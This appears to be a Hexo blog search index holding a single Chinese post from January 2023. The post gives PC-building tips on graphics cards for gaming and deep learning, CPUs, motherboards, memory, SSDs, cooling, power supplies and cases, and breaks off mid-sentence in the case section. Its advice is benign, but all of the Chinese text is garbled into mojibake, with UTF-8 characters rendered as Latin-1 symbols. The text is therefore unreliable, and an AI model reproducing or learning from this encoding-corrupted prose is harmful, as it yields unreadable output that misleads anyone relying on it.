<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æ”’æœºå°æŠ€å·§</title>
      <link href="2023/01/16/%E6%94%92%E6%9C%BA%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
      <url>2023/01/16/%E6%94%92%E6%9C%BA%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>è¿«äºç›®å‰è‡ªç”¨ç¬”ç”µGPUæ€§èƒ½è¿‡äºä¸è¶³ï¼Œè¿ä¸€äº›åŸºç¡€çš„DLæ¨¡å‹éƒ½æ”¾ä¸ä¸‹æˆ–è€…è·‘çš„å¤ªæ…¢ï¼Œè€Œæœ€è¿‘åˆšå¥½Nvidiaå’ŒAMDéƒ½åœ¨å‘å¸ƒæ–°GPUï¼Œæ‰€ä»¥å‡†å¤‡é«˜åº¦å®šåˆ¶åŒ–åœ°é…ä¸€å°æœºå­</p><p>æœ¬æ–‡å…·æœ‰è¾ƒå¼ºçš„æ—¶æ•ˆæ€§ï¼Œéƒ¨åˆ†å†…å®¹å¯èƒ½ä¸é€‚ç”¨ä¸æœªæ¥çš„ç¡¬ä»¶å¸‚åœº</p><span id="more"></span><h1 id="æ”’æœºå°æŠ€å·§"><a href="#æ”’æœºå°æŠ€å·§" class="headerlink" title="æ”’æœºå°æŠ€å·§"></a>æ”’æœºå°æŠ€å·§</h1><p>é¦–å…ˆæ˜ç¡®ä¸€ç‚¹ï¼Œ<strong>æŒ‰éœ€è´­ä¹°</strong>ï¼Œå…ˆæ˜ç¡®è‡ªå·±çš„ç”¨é€”ä¼šè·‘æ»¡ä¸åŒç¡¬ä»¶çš„ç™¾åˆ†ä¹‹å¤šå°‘ï¼Œç„¶ååœ¨ä¿è¯ä¸å‡ºç°æœ¨æ¡¶æ•ˆåº”çš„æƒ…å†µä¸‹æŠŠéœ€æ±‚ä¸é«˜çš„ç¡¬ä»¶æ°´å¹³å°½é‡æ‹‰ä½</p><h2 id="æ˜¾å¡"><a href="#æ˜¾å¡" class="headerlink" title="æ˜¾å¡"></a>æ˜¾å¡</h2><p>å¯¹äºç›®å‰çš„ç¡¬ä»¶å¸‚åœºï¼Œæ˜¾å¡æ˜¯æ°´æœ€æ·±çš„ä¸€å—ï¼Œæ¨èåœ¨æ”’æœºä¸­ä¼˜å…ˆç¡®å®šæ˜¾å¡ï¼Œå…·ä½“åˆ°æŸä¸€æ¬¾çš„å‹å·ï¼Œå¦‚ï¼šä¸ƒå½©è™¹4090ç«ç¥</p><p>è™½ç„¶40ç³»å·²ç»å‘å¸ƒï¼Œä½†ç¢äºè€é»„30ç³»åº“å­˜æ²¡æ¸…å®Œï¼Œè‹å¦ˆ7900xtè¡¨ç°æ¬ ä½³ï¼Œæ˜¾å¡ä»·æ ¼å±…é«˜ä¸ä¸‹ï¼Œç­‰ç­‰å…šåœ¨çŸ¿æ½®æ—¶æœŸå¾…çš„40ç³»å‘å¸ƒåæ˜¾å¡ä»·æ ¼è¿æ¥æ–­å´–å¼ä¸‹è·Œçš„æ„¿æ™¯å¹¶æœªå®Œå…¨è¾¾æˆï¼Œä¸”æ ¹æ®ç›®å‰çš„å¸‚åœºå½¢åŠ¿ï¼Œ4070tiä¸4080è™½ç„¶å®šä»·åˆç†æ€§æ¬ ç¼ºï¼Œä½†ä»ä¼šæˆä¸ºå¾ˆå¤šâ€œé»˜è®¤30å…¨çŸ¿â€ä»¥åŠåˆšéœ€çš„é€‰æ‹©ï¼Œ40ç³»çš„é™ä»·æ¡ä»¶ä¸»è¦è¿˜æ˜¯åœ¨äº30ç³»çš„åº“å­˜ç§¯å‹æƒ…å†µï¼Œè€Œä¸æ˜¯å¸‚åœºä¾›éœ€å…³ç³»ï¼ˆæ¯•ç«Ÿè¿™å°±æ˜¯ä¸ªå„æ–­çš„è¡Œä¸šï¼ŒNvidiaç™¾åˆ†ä¹‹å…«ä¹åçš„å¸‚åœºå æœ‰ç‡ï¼Œæ ¹æœ¬æ²¡æœ‰ä»€ä¹ˆä¾›éœ€é—®é¢˜ï¼‰ï¼Œæ‰€ä»¥åœ¨çŸ­æ—¶é—´å†…æ—¢ç„¶æ— æ³•æ”¹å˜è¿™äº›ç°çŠ¶ï¼Œé‚£æˆ‘è¿˜æ˜¯æ¨èç°åœ¨<em>æ—©ä¹°æ—©äº«å—</em>ï¼Œè™½ç„¶è´­ä¹°åæ˜¾å¡ä¼šæŒç»­ç¼“æ…¢æ‰ä»·ï¼Œä½†è¿™ä¹Ÿæ­£æ˜¯ç”µå­äº§å“æœ¬èº«å› ä¸ºæ‘©å°”å®šå¾‹ä¸å¯é¿å…çš„å±æ€§ï¼›è€Œ<em>æ™šä¹°äº«æŠ˜æ‰£</em>çš„äº‹å®æ˜¯ï¼šè™½ç„¶ç¡®å®äº«å—åˆ°äº†æ™šä¹°çš„æŠ˜æ‰£ï¼Œä½†è¿™æœŸé—´ä½ çš„GPUéœ€æ±‚å¦‚ä½•è§£å†³ï¼Œè¿™æ®µç­‰å¾…çš„æ—¶é—´æ˜¯å¦å¯¹ä½ é€ æˆäº†å®è´¨æ€§çš„å½±å“ï¼Œä½ æ˜¯å¦ç¡®å®šåœ¨æœªæ¥çš„æŸä¸€ä¸ªæ—¶é—´ç‚¹æ˜¾å¡ä»·æ ¼ä¼šè¾¾åˆ°ä½ ç°åœ¨çš„é¢„æœŸï¼Œéƒ½æ˜¯éœ€è¦è€ƒè™‘è¿›æ¥çš„éšæ€§æˆæœ¬ï¼Œè§ä»è§æ™ºå§</p><p><strong>é‡è¦ç¡¬ä»¶å‚æ•°</strong></p><ul><li>æ˜¾å­˜å¤§å°ï¼šåœ¨æ¸¸æˆä¸­ä¸»è¦å†³å®šäº†èƒ½ä¸Šå¤šç»†èŠ‚çš„æè´¨ï¼Œåœ¨DLä¸­å†³å®šäº†èƒ½æ”¾çš„æ¨¡å‹è§„æ¨¡ä¸<code>batchSize</code></li><li>æ˜¾å¡æ¶æ„ï¼šä¸åŒçš„æ¶æ„å¯¹äºå„ç§è¿ç®—çš„é€Ÿåº¦æ˜¯ä¸åŒçš„ï¼Œé€šå¸¸æ¥è¯´è¶Šæ–°çš„æ˜¾å¡æ¶æ„ä¼˜åŒ–è¶Šå¥½é€Ÿåº¦è¶Šå¿«ï¼Œèƒ½è€—æ¯”ä¹Ÿå¥½</li><li>æ˜¾å­˜ä½å®½ï¼šå½±å“æ˜¾å¡ä¸å…¶ä»–ç¡¬ä»¶çš„äº¤äº’é€Ÿåº¦ï¼Œæ¸¸æˆä¸­ä½“ç°åœ¨ä¼šå½±å“å¯ä»¥ä½¿ç”¨çš„åˆ†è¾¨ç‡ä¸Šé™ï¼Œæ¯”å¦‚è¿™æ¬¡çš„4070tiï¼ˆor 4080 12Gï¼‰ä½å®½192bitå¤ªä½ï¼Œå¯¼è‡´4Ké«˜åˆ·æ–°ç‡åœ¨è¿™å¼ æ˜¾å¡ä¸Šå‡ ä¹æˆä¸ºä¸å¯èƒ½çš„äº‹æƒ…ï¼Œåœ¨DLä¸­å½±å“äº†æ•°æ®å†™å…¥æ˜¾å­˜çš„é€Ÿåº¦ï¼Œä½çš„ä½å®½ä¸‹è®­ç»ƒé€Ÿåº¦æ›´æ…¢</li><li>æ˜¾å­˜é¢‘ç‡ï¼šæ¯ç§’äº¤äº’æ¬¡æ•°ï¼Œæ€§èƒ½ä¸å¤Ÿçš„æ—¶å€™è¿›è¡Œæ˜¾å¡è¶…é¢‘å°±æ˜¯æŒ‡è¶…æ˜¾å­˜é¢‘ç‡ï¼Œæ˜¾å­˜çš„é»˜è®¤é¢‘ç‡åœ¨åŒä¸€GPUçš„ä¸åŒå‹å·ä¸‹ç•¥æœ‰ä¸åŒï¼Œä½†é€šå¸¸ä¸æ„æˆè‡´å‘½å·®è·ï¼Œæ‰€ä»¥è¿™ä¸€æŒ‡æ ‡é€šå¸¸ä¸ä¼šè¢«é‡ç‚¹åæ§½</li></ul><p><strong>éç¡¬ä»¶æŒ‡æ ‡çš„å…³æ³¨ç‚¹</strong></p><ul><li>æ˜¾å¡å°ºå¯¸ï¼šéšç€æ˜¾å¡è¿­ä»£ï¼Œå°ºå¯¸è¶Šåšè¶Šå¤§ï¼Œçœ‹å¥½æ˜¾å¡å°ºå¯¸ä»¥é˜²æ­¢è£…ä¸è¿›æœºç®±æˆ–è€…ä¸CPUé£å†·æ•£çƒ­å™¨é³ç‰‡å†²çªï¼ŒITXæˆ–MATXæœºç®±å°¤å…¶éœ€è¦è€ƒè™‘è¿™ä¸€ç‚¹</li><li>æ˜¾å¡å“ç‰Œï¼šå°½é‡é€‰æ‹©æ”¯æŒ<strong>ä¸ªäººé€ä¿</strong>çš„æ˜¾å¡å“ç‰Œï¼Œå°¤å…¶æ˜¯åœ¨éå®˜æ–¹çš„æ·˜å®åº—è´­ä¹°æ˜¾å¡æ—¶ã€‚å¯¹äºç›®å‰æœ€ä¾¿å®œçš„ä¸‡ä¸½çš„æ˜¾å¡ï¼Œè™½ç„¶å…·æœ‰è¶…é«˜æ€§ä»·æ¯”ï¼Œä½†æ˜¯å›½å†…ä¸æ”¯æŒä¸ªäººé€ä¿ï¼Œä»…æµ·å¤–æ”¯æŒï¼Œæ‰€ä»¥å¯¹äºè¿™ä¸ªå“ç‰Œçš„é€‰æ‹©å°±è§ä»è§æ™ºäº†ï¼Œä½†å°±æˆ‘ä¸ªäººè€Œè¨€ä¸æ¨è</li><li>æ˜¯å¦åŠè£…ï¼šæ˜¾å¡åŠè£…æ˜¯æŒ‡ï¼šå°†æ˜¾å¡IOæœä¸Šï¼Œç«–ç›´åŠè£…ï¼ˆIOæœä¸‹å«ç«–è£…ä¸å«åŠè£…ï¼‰ã€‚éƒ¨åˆ†ç«‹å¼ITXæœºç®±æˆ–ä¸€äº›æœ‰ä¸ªæ€§çš„ATXæœºç®±ä¼šåšè¿™æ ·çš„æ“ä½œï¼ŒåŠè£…æœ€å¤§çš„é—®é¢˜å°±æ˜¯ä¼šå¯¼è‡´çƒ­ç®¡ä¸­çš„å†·å´æ¶²å›æµæ—¶éœ€è¦é¢å¤–å…‹æœé‡åŠ›ï¼Œè™½ç„¶é€†é‡åŠ›çƒ­ç®¡ä¸æ˜¯éå¸¸æ˜‚è´µçš„æŠ€æœ¯ï¼Œä½†å¸‚é¢ä¸Šçš„æ˜¾å¡ä¸­è¿˜æ˜¯æœ‰ç›¸å½“å¤šçš„æ˜¾å¡åœ¨åŠè£…åæ¸©åº¦ç›´æ¥é£™å‡10â„ƒï¼Œæ›´å¯æ¶çš„æ˜¯å‡ ä¹æ‰¾ä¸åˆ°å…³äºâ€œä¸»æµå‹å·æ˜¾å¡åŠè£…å¯¹æ¸©åº¦å½±å“â€çš„å…¨é¢è¯„æµ‹ï¼Œäº§å“è¯´æ˜ä¸­ä¹Ÿä¸ä¼šå¯¹åŠè£…åšå•ç‹¬è¯´æ˜ï¼Œèƒ½ç¡®å®šä¸‹æ¥åŠè£…æ— å½±å“çš„éƒ½æ˜¯å°‘æ•°ï¼Œæ‰€ä»¥åœ¨é€‰æ‹©åŠè£…æ—¶è¦ä¹ˆæ‰¾å®˜æ–¹å•†å®¶é—®æ¸…æ¥šï¼Œè¦ä¹ˆåˆšå¥½æ‰¾åˆ°å¯¹åº”å‹å·çš„åŠè£…æµ‹è¯•ç»“æœï¼Œå¦åˆ™å…¨é è‡ªå·±æ‘¸å¥–</li></ul><p><strong>40ç³»çš„æ³¨æ„äº‹é¡¹</strong></p><ul><li>4080å’Œ4090ç”¨çš„æ˜¯åŒç­‰è§„æ ¼çš„æ•£çƒ­ï¼Œ90éƒ½æ•£çƒ­å†—ä½™äº†ï¼Œ80æ›´æ˜¯å‹å¾—æ­»æ­»çš„ï¼Œå¦‚æœæ˜¯4080æˆ–è€…4090åˆ™å®Œå…¨ä¸éœ€è¦æ‹…å¿ƒæ˜¾å¡çš„æ•£çƒ­</li><li>4080å’Œ4090è¶…é¢‘èƒ½åŠ›éƒ½è¾ƒä½ï¼Œå°è¶…å°±ä¼šåŠŸè€—é£™å‡</li></ul><p><strong>30ç³»çš„æ³¨æ„äº‹é¡¹</strong></p><ul><li><p>30ç³»é»˜è®¤å…¨çŸ¿æ˜¯éå¸¸æ¿€è¿›çš„è§‚ç‚¹ï¼Œç›®å‰æˆ‘çŸ¥é“çš„æ˜¯3060tiæœ‰å‡ æ¬¾å‹å·å‘å¸ƒæ—¥æœŸè¾ƒæ™šï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ— çŸ¿ï¼Œ3090tiå‘å¸ƒæ—¥æœŸä¹Ÿè¾ƒæ™šï¼ŒåŸºæœ¬æ— çŸ¿ï¼ˆä½†ç”±äºå·²ç»åœäº§ï¼ŒåŒæ—¶æ˜¯ä¸Šä»£æ——èˆ°ï¼Œé™¤äº†æ˜¾å­˜ä¼˜åŠ¿ä»¥å¤–æ€§ä»·æ¯”æä½ï¼‰ï¼Œç ”ç©¶ä¸€ä¸‹åº”è¯¥è¿˜æ˜¯å¯ä»¥æ‰¾åˆ°ä¸€äº›æ— çŸ¿å‹å·ï¼Œç›®å‰æœ€ä¸»æµçš„æ˜¾å¡ä»ç„¶æ˜¯GTX 1650ï¼ŒRTX 3060çš„å æ¯”ä¹Ÿåœ¨å¿«é€Ÿä¸Šå‡ï¼Œæ‰€ä»¥ç›®å‰è´­å…¥3060tiçš„æ— çŸ¿å‹å·çš„è¯ï¼Œå‡ ä¹å¯ä»¥åŠæ‰“å¸‚é¢ä¸Šæ‰€æœ‰æ¸¸æˆï¼Œä¹Ÿå› ä¸ºåœ¨æœªæ¥ä¼šæˆä¸ºä¸‹ä¸€ä»£ä¸»æµæ˜¾å¡ï¼Œå„å¤§æ¸¸æˆå‚å•†å°†ä¼šä»¥3060tiå·¦å³çš„æ ‡å‡†å»ä¼˜åŒ–æ¸¸æˆï¼ŒåŒæ—¶ï¼Œ3060tiè¿˜æ˜¯ç›®å‰æ‰€æœ‰Nå¡ä¸­æ€§ä»·æ¯”æœ€é«˜çš„å‹å·ï¼Œæˆ‘å®åœ¨æƒ³ä¸å‡ºåœ¨3060tiæ€§èƒ½å¤Ÿç”¨ä¸”æ— çŸ¿çš„æƒ…å†µä¸‹è´­ä¹°æ›´é«˜æ€§èƒ½æ˜¾å¡çš„ç†ç”±</p></li><li><p>3090tiåœ¨40ç³»å‘å¸ƒä¹‹å‰æ˜¯ç‚¼ä¸¹å¸ˆçš„å¥½æœ‹å‹ï¼Œä½†è¯·çœ‹å¦‚ä¸‹å‚æ•°</p><table><thead><tr><th>å‹å·</th><th>ç›®å‰æœ€ä½ä»·æ ¼</th><th>æ˜¾å­˜</th><th>ä½å®½</th><th>CUDA</th></tr></thead><tbody><tr><td>4080</td><td>8299</td><td>16G</td><td>256bit</td><td>9728</td></tr><tr><td>3090ti</td><td>10499</td><td>24G</td><td>384bit</td><td>10752</td></tr></tbody></table><p>  æˆ‘æ¨èå¦‚ä¸‹è§£å†³æ–¹æ¡ˆï¼š</p><p>  4080åœ¨å¤§å¤šæ•°åŸºæœ¬çš„ç‚¼ä¸¹ä¸Šéƒ½å·²ç»å¯ä»¥handleï¼Œé«˜çº§å¤§è§„æ¨¡ç‚¼ä¸¹å»ºè®®ç›´æ¥ä¸Šäº‘</p><p>  3090tié€šå¸¸åŒå¡èµ°NV Linkï¼Œ30ç³»ç›¸æ¯”èµ·40ç³»è€Œè¨€ï¼Œåˆ©ç”¨å…¶é«˜é€ŸNV LinkåŠ ä¸Šå¤§æ˜¾å­˜ä¹Ÿæ˜¯ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œä½†å°±ç›®å‰æåº¦ç¼ºè´§ä»¥åŠæ€§ä»·æ¯”çš„é—®é¢˜ï¼Œ3090tiå¾ˆå¯èƒ½åœ¨ä¸ä¹…åä»å¸‚åœºä¸ŠåŸºæœ¬æ¶ˆå¤±</p></li></ul><p><strong>Aå¡æ³¨æ„äº‹é¡¹</strong></p><ul><li>AMDä¸é€‚åˆç‚¼ä¸¹ï¼Œæ²¡æœ‰CUDA</li><li>AMDæœ¬æ¬¡æ——èˆ°7900XTXä»¥åŠ7900XTçš„æ€§èƒ½å’Œä»·æ ¼éƒ½è®©äººğŸ˜…</li></ul><h2 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h2><p>ç›®å‰CPUçš„çº¢è“ä¹‹äº‰è¿˜ç®—æ¿€çƒˆï¼Œæ‰€ä»¥çº¢è“ä¸¤å®¶CPUéƒ½å¯ä»¥é€‰æ‹©ï¼Œå°±æ™®é€šç”¨æˆ·è€Œè¨€ï¼Œç›®å‰çš„CPUæ€§èƒ½å°±ç®—æ˜¯æ‰“æ¸¸æˆä¹Ÿæ˜¯è¿‡å‰©40%~60%çš„ï¼Œä½†ä¸ºäº†åŒ¹é…æ˜¾å¡çš„è®¡ç®—èƒ½åŠ›ï¼Œä¹Ÿä¸èƒ½ä¸Šè¿‡äºä½ç«¯çš„Uï¼Œå¦åˆ™CPUçƒ¤è‚‰å’ŒCPUç“¶é¢ˆéƒ½ä¸æ˜¯æ¢¦</p><p>ç›®å‰å¯¹äºè“æ–¹é˜µè¥ï¼Œ13600KFæ­é…4080æˆ–4070tiï¼ˆor 4080 12Gï¼‰ï¼Œ13700KFæ­é…4090æ˜¯æ¯”è¾ƒä¸»æµçš„é€‰æ‹©ï¼›çº¢æ–¹æˆ‘æ²¡æœ‰å¤ªåšäº†è§£ï¼Œä½†å¯¹äºè€æ¬¾å‹å·ï¼Œçº¢æ–¹é˜µè¥çš„ç»¼åˆæ€§ä»·æ¯”ç¡®å®éå¸¸é«˜ï¼Œå¯ä»¥è€ƒè™‘è‡ªè¡Œäº†è§£</p><p>å¯¹CPUéœ€æ±‚é«˜çš„å·¥ä½œï¼Œæˆ‘åªå¬è¯´è¿‡è§†é¢‘å‰ªè¾‘ï¼›å¯¹CPUå•æ ¸æ€§èƒ½è¦æ±‚é«˜çš„ï¼Œæˆ‘è¿˜å¬è¯´è¿‡MinecraftæœåŠ¡å™¨ã€‚æ‰€ä»¥äº†è§£æ¸…æ¥šä½ çš„CPU Usageï¼Œåœ¨ä¸»æµçš„æ­é…ä¸Šé€‰æ‹©æ€§å‡çº§</p><p>CPUä¸åƒæ˜¾å¡é‚£ä¹ˆéœ€è¦çº ç»“ï¼Œè®¤å‡†éœ€è¦çš„å‹å·å°±å¯ä»¥äº†</p><p><strong>CPUåç¼€å«ä¹‰</strong></p><ul><li>Kåç¼€ï¼šå¯è¶…é¢‘ä¸é”é¢‘</li><li>Fåç¼€ï¼šä¸å¸¦æ ¸æ˜¾ï¼Œéœ€ç‹¬ç«‹æ˜¾å¡</li><li>Tæˆ–Såç¼€ï¼šèŠ‚èƒ½ç‰ˆ</li></ul><p><strong>ç›’è£…ä¸æ•£ç‰‡</strong></p><ul><li>ç›’è£…æœ‰ä¿ä¿®ï¼Œæ•£ç‰‡æœ€å¤šåº—ä¿</li><li>ç›’è£…æ›´è´µ</li><li>é€šå¸¸intelçš„Uä¹°æ•£ç‰‡å°±å¯ä»¥äº†ï¼Œç¿»è½¦ç‡æä½ï¼Œç²¾ç¥æ´ç™–è€…æ„¿æ„å¤šæå‡ ç™¾å—å°±ä¹°ç›’è£…</li></ul><h2 id="ä¸»æ¿"><a href="#ä¸»æ¿" class="headerlink" title="ä¸»æ¿"></a>ä¸»æ¿</h2><p>ä¸»æ¿å¤§å°ä¸»è¦æœ‰ATXï¼ŒMATXï¼ŒITXç‰ˆå‹ï¼Œé€šå¸¸ä¸€ä»£Uå¯¹åº”ä¸€ä»£æ¿ï¼Œæ‰€ä»¥ä¼šæœ‰å¾ˆå¤šæ¿Uç»„åˆåœ¨å”®</p><p><strong>æ³¨æ„äº‹é¡¹</strong></p><ul><li>å¯¹äºIntelï¼Œå¤§å¤šæ•°12ä»£æ¿å¯ä»¥æ”¯æŒ13ä»£Uï¼Œä½†éœ€è¦åˆ·BIOSï¼Œå¦åˆ™æ— æ³•ç‚¹äº®ï¼Œæ‰€ä»¥ä¸ªäººè£…æœºè¿˜æ˜¯å»ºè®®å“ªä¸€ä»£Uå°±å¥—å“ªä¸€ä»£æ¿ï¼Œä¼šæ¯”è¾ƒç¨³å¦¥</li><li>æœ‰çš„ä¸»æ¿å‹å·æˆ–æ•´ä¸ªç³»åˆ—éƒ½æ— æ³•å¯¹CPUæˆ–å†…å­˜è¿›è¡Œè¶…é¢‘ï¼Œæ‰€ä»¥äº†è§£æ¸…æ¥šåï¼Œå¦‚æœä¸èƒ½è¶…é¢‘ï¼Œé‚£å°±å°½é‡é€‰æ‹©ä¸å¸¦Kçš„Uï¼Œè¿˜å¯ä»¥é€‰æ‹©è¶…é¢‘ç©ºé—´ä¸é«˜çš„å†…å­˜</li><li>é€šå¸¸å¸¦WIFIæ¨¡å—çš„ä¸»æ¿ä¼šæ¯”åŒå‹å·ä¸å¸¦WIFIçš„ä¸»æ¿è´µå‡ åå—ï¼Œå¦‚æœæœ‰æ— çº¿éœ€æ±‚è¿˜æ˜¯å»ºè®®ç›´æ¥åŠ è¿™å‡ åå—</li><li>å…³æ³¨ä¸»æ¿é£æ‰‡æ¥å£æ•°é‡ï¼Œå¦‚æœæœºç®±é£æ‰‡å¤ªå¤šåˆ™éœ€è¦é¢å¤–è´­ä¹°é›†çº¿å™¨</li></ul><h2 id="å†…å­˜"><a href="#å†…å­˜" class="headerlink" title="å†…å­˜"></a>å†…å­˜</h2><p>ç°åœ¨å†…å­˜ä»·æ ¼æ— è®ºæ˜¯DDR4è¿˜æ˜¯DDR5éƒ½æ¯”è¾ƒä¾¿å®œï¼Œæ ¹æ®ä»¥ä¸‹å‡ ç‚¹é€‰å‡ºåˆé€‚çš„å³å¯</p><p><strong>æ³¨æ„äº‹é¡¹</strong></p><ul><li><p>DDR4è¿˜æ˜¯DDR5ä¸»è¦çœ‹ä¸»æ¿çš„è¦æ±‚ï¼Œä¸èƒ½DDR5ä¸»æ¿ä¸ŠDDR4å†…å­˜</p></li><li><p>å¯¹äºå†…å­˜çš„å“è´¨ï¼Œå“ç‰Œæ˜¯ä¸€æ–¹é¢ï¼Œä½†æ›´é‡è¦çš„æ˜¯å†…å­˜é¢—ç²’çš„å“è´¨ï¼Œè¿™ä¸ªå¯ä»¥å»è‡ªè¡Œäº†è§£</p></li><li><p>å†…å­˜ä¸ä¸»æ¿ã€CPUå¯†åˆ‡æŒ‚é’©ï¼Œå› ä¸ºä¸»æ¿ä¸CPUéƒ½ä¼šå¤šå°‘å½±å“åˆ°å†…å­˜èƒ½ä¸Šåˆ°çš„é¢‘ç‡ï¼Œä¸¾ç‚¹ä¾‹å­</p><ul><li>CPUæœ€å¤§æ”¯æŒ2666MHzï¼Œä¸»æ¿æœ€é«˜æ”¯æŒ3200MHzå†…å­˜ä¸”<strong>ä¸</strong>æ”¯æŒå†…å­˜è¶…é¢‘ï¼Œå†…å­˜ä¸º3200MHzï¼Œç”±äºCPUæœ€é«˜åªåˆ°2666MHzï¼Œæ‰€ä»¥å†…å­˜ä¹Ÿåªèƒ½è·‘åˆ°è¿™ä¸ªé¢‘ç‡</li><li>CPUæœ€å¤§æ”¯æŒ2666MHzï¼Œä¸»æ¿æœ€é«˜æ”¯æŒ3200MHzå†…å­˜ä¸”æ”¯æŒå†…å­˜è¶…é¢‘ï¼Œå†…å­˜ä¸º3200MHzï¼Œè™½ç„¶CPUæœ€é«˜åªåˆ°2666MHzï¼Œä½†æ˜¯ä¸»æ¿æ”¯æŒå†…å­˜è¶…é¢‘ï¼Œæ‰€ä»¥å†…å­˜å¯ä»¥è·‘åˆ°3200MHz</li></ul></li><li><p>å»ºè®®è´­ä¹°å¥—æ¡ï¼Œå› ä¸ºä½“è´¨ç›¸ä¼¼ï¼Œç¨³å®šæ€§å¥½ä¸”è¶…é¢‘æ€§èƒ½æ›´æ¥è¿‘ï¼Œä¸ä¼šå‡ºç°æœ¨æ¡¶æ•ˆåº”</p></li><li><p>å»ºè®®ç»„æˆåŒé€šé“ï¼Œå³8G*2å¥—æ¡è€Œä¸æ˜¯16Gå•æ¡ï¼Œå¯ä»¥è·å¾—æ›´å¤§çš„å¸¦å®½</p></li><li><p>æ’å†…å­˜çš„æ—¶å€™ï¼Œå¦‚æœä¸»æ¿æœ‰4ä¸ªæ’æ§½ä¸”ä¸ºåŒé€šé“ï¼Œéœ€è¦æ’13æ§½æˆ–è€…24æ§½ï¼ˆæ¨è24æ§½ï¼‰ï¼Œå¦‚æœæ’12æ§½æˆ–è€…34æ§½åˆ™åªä½¿ç”¨äº†å•é€šé“</p></li></ul><h2 id="ç¡¬ç›˜"><a href="#ç¡¬ç›˜" class="headerlink" title="ç¡¬ç›˜"></a>ç¡¬ç›˜</h2><p>ç°åœ¨å›ºæ€çš„ä»·æ ¼éå¸¸å®æƒ ï¼Œç»å¤§å¤šæ•°äººå·²ç»ä¸ä¼šåœ¨PCä¸­é…æœºæ¢°ç¡¬ç›˜äº†ï¼Œå»ºè®®è¿˜æ˜¯ä¹°å¤§å‚çš„ä¸­é«˜ç«¯è´§ï¼Œæ¯•ç«Ÿæ•°æ®æ— ä»·ï¼Œæ›´ä½•å†µä¸€å—ä¼˜ç§€çš„å›ºæ€å¯ä»¥æå¤§æå‡ç”µè„‘çš„ä½¿ç”¨ä½“éªŒï¼Œæ‰€ä»¥å°±ä¸è¦å¤ªæŠ äº†</p><h2 id="æ•£çƒ­"><a href="#æ•£çƒ­" class="headerlink" title="æ•£çƒ­"></a>æ•£çƒ­</h2><p>CPUæ•£çƒ­åˆ†ä¸ºé£å†·å’Œæ°´å†·ï¼Œæ°´å†·åˆåˆ†ä¸ºä¸€ä½“æ°´å’Œåˆ†ä½“æ°´</p><p><strong>æ³¨æ„äº‹é¡¹</strong></p><ul><li>åŒç­‰ä»·ä½æ¥è¯´ï¼Œé€šå¸¸é£å†·çš„æ•£çƒ­æ•ˆæœä¼˜äºæ°´å†·ï¼Œä½†æ˜¯æ°´å†·çš„æ•£çƒ­ä¸Šé™æ›´é«˜</li><li>æ°´å†·ç›´æ¥å°†CPUçƒ­é‡é€šè¿‡å†·å´æ¶²å¸¦åˆ°å†·æ’ï¼Œå†ä»å†·æ’ç›´æ¥å¹å‡ºæœºç®±å¤–ï¼Œè€Œé£å†·åªæ˜¯å°†CPUçƒ­é‡ä»CPUè½¬ç§»åˆ°æœºç®±å†…çš„ç©ºæ°”ä¸­ï¼Œæ‰€ä»¥å¦‚æœæœºç®±é€šé£æ•ˆæœä¸å¥½ï¼Œå»ºè®®ç›´æ¥æ°´å†·ï¼Œæˆ–è€…ä¸Šå‡ æŠŠæœºç®±é£æ‰‡è¾…åŠ©æ•£çƒ­</li><li>æœºç®±é£é“çš„æ„å»ºé€šå¸¸éµå¾ªå‰è¿›åå‡ºï¼Œä¸‹è¿›ä¸Šå‡ºçš„åŸåˆ™ï¼Œè¿›é£å¤§äºå‡ºé£ç§°ä¸ºæ­£å‹ï¼Œåä¹‹ç§°ä¸ºè´Ÿå‹</li><li>æ°´å†·å†·æ’é€šå¸¸è§„æ ¼è¶Šå¤§æ•£çƒ­æ•ˆæœè¶Šå¥½ï¼Œä½†é€‰æ‹©å†·æ’æ—¶éœ€è¦è€ƒè™‘æœºç®±å…¼å®¹æ€§é—®é¢˜</li></ul><h2 id="ç”µæº"><a href="#ç”µæº" class="headerlink" title="ç”µæº"></a>ç”µæº</h2><p>æ ¹æ®ç¡¬ä»¶åŠŸè€—é€‰æ‹©åˆé€‚ç“¦æ•°çš„ç”µæºå³å¯ï¼Œå°½é‡é€‰æ‹©ä¸€çº¿å“ç‰Œï¼ˆè¿™ä½ ä¹Ÿæ•¢çœï¼Ÿ</p><p>ç”µæºé‡‘é“¶é“œç‰Œå°±æ˜¯å¸®ä½ çœç”µè´¹ï¼Œä¸èƒ½å®Œå…¨ä»£è¡¨ç”µæºå“è´¨</p><p>æ¨¡ç»„ç”µæºä¸­ï¼Œç”µæºå’Œçº¿æå®Œå…¨åˆ†ç¦»ï¼›åŠæ¨¡ç»„ç”µæºä¸­ï¼Œéƒ¨åˆ†å¸¸ç”¨çº¿æä¸ç”µæºä¸ºä¸€ä½“ï¼Œå…¶ä»–çº¿æå®Œå…¨åˆ†ç¦»ï¼›éæ¨¡ç»„ç”µæºä¸­ï¼Œæ‰€æœ‰çº¿æéƒ½ä¸ç”µæºä¸€ä½“ï¼Œç”¨ä¸åˆ°çš„çº¿æåªèƒ½è®©ä»–åŠç€</p><p>ç”µæºæ ¹æ®å¤§å°åˆ†ä¸ºATXï¼ŒSFX-Lï¼ŒSFXç”µæºï¼Œé€šå¸¸ä½¿ç”¨æœ€å°çš„SFXç”µæºä¸ITXä¸»æ¿æ­é…æ„å»ºITX PC</p><h2 id="æœºç®±"><a href="#æœºç®±" class="headerlink" title="æœºç®±"></a>æœºç®±</h2><p>æœºç®±æ ¹æ®å…¼å®¹çš„ä¸»æ¿ç±»å‹ä¸åŒï¼Œåˆ†ä¸ºATXï¼ŒMATXï¼ŒITXæœºç®±ï¼Œæ ¹æ®æ”¯æŒçš„é£å†·æ•£çƒ­å™¨é«˜åº¦ä¸åŒï¼Œåˆ†ä¸ºå…¨å¡”ã€ä¸­å¡”æœºç®±</p><p>æœºç®±æ˜¯é—¨å¤§å­¦é—®ï¼Œå› ä¸ºæœºç®±çš„è®¾è®¡å½±å“äº†é£é“çš„è®¾è®¡ï¼Œä¹Ÿå†³å®šäº†ä½ 